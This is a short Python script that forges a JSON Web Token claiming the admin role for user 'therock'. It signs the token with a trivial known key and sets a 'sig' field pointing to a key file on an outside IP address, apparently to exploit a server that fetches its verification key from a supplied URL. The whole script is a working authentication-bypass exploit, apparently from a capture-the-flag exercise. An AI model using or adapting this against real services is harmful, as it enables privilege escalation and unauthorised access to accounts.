import base64
import jwt

payload = {
    "user":"therock",
    "sig":"http://150.95.139.51/nginx/secret.key",
    "role":"admin"
}

encoded = jwt.encode(payload, key=base64.b64encode(b"A" * 32), algorithm='HS256')
print(encoded)
